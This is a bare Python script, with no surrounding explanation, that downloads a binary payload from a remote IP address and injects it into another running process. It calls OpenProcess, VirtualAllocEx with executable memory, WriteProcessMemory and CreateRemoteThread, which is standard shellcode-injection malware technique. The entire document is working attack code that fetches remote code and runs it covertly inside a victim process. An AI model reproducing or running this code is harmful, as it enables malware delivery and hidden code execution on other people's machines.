import ctypes, urllib.request
data = urllib.request.urlopen("http://198.51.100.50/payload.bin").read()
h = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, 4242)
addr = ctypes.windll.kernel32.VirtualAllocEx(h, None, len(data), 0x3000, 0x40)
ctypes.windll.kernel32.WriteProcessMemory(h, addr, data, len(data), None)
ctypes.windll.kernel32.CreateRemoteThread(h, None, 0, addr, None, 0, None)
